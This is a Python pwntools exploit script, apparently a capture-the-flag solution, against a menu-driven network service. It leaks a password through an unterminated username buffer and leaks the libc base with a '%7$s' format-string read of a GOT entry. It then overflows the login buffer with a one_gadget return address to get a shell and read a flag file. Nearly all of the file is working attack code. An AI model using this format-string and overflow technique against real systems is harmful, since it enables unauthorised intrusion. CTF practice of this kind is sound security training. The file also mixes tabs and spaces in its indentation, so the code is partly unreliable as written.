import os
from pwn import *

def i(t):
	t.interactive()

def prompt(t):
	t.recvuntil("4: Manage\n")

########## Step1 ##########

def leak_password(t):
	t.recvuntil("3: Exit\n")
	t.sendline("2")
	t.recvuntil("username : ")
	t.sendline("A" * 31)
	t.recvuntil("A" * 31 + "\n")
	password = t.recvline()
	print("[!] Password : " + password)


########## Step2 ##########

def login(t):
        USERNAME = "_H4CK3R_"
        PASSWORD = "3XPL01717"

        t.recvuntil("3: Exit\n");
        t.sendline("2")
        t.recvuntil("username : ")
        t.sendline(USERNAME)
        t.recvuntil("password : ")
        t.sendline(PASSWORD)

        t.recvuntil("Logged in!")


def leak_libc_addr(t):
	libc_start_main_got_addr = 0x601fa0
        libc_start_main_offset = 0x20640
        one_gadget_offset = 0xd5c17

        prompt(t)
        t.sendline("4")
        t.recvuntil("Input file name\n")
        buf = "%7$s" * 2
        buf += p64(libc_start_main_got_addr)
        t.sendline(buf)
        t.recvuntil("Filename : ")
        data = t.recv(6)
        data += "\x00\x00"

        libc_start_main_addr = u64(data)
        libc_base_addr = libc_start_main_addr - libc_start_main_offset
        one_gadget_addr = libc_base_addr + one_gadget_offset
        print("[!] libc_base_addr = {0:x}".format(libc_base_addr))

        return one_gadget_addr


def login_bof(t,addr):
	prompt(t)
	t.sendline("2")
	t.recvuntil("username : ")
	buf = "A" * 0x68
	buf += p64(addr)
	t.sendline(buf)

	t.recvuntil("password : ")
	t.sendline("AAAAAAAAAA")

	t.sendline("./cat 810a0afb2c69f8864ee65f0bdca999d7_FLAG")
	print(t.recv(1024))
	# i(t)


def get_shell(t):
	login(t)
	addr = leak_libc_addr(t)
	login_bof(t,addr)

def main():
	if os.environ.get("TARGET_HOST") is None:
		t = remote("localhost",33333)
	else:
		t = remote(os.environ.get("TARGET_HOST"),33333)

	# Step1 : Leak password
	# leak_password(t)

	# Step2 : Get Shell
	get_shell(t)

if __name__ == '__main__':
	main()
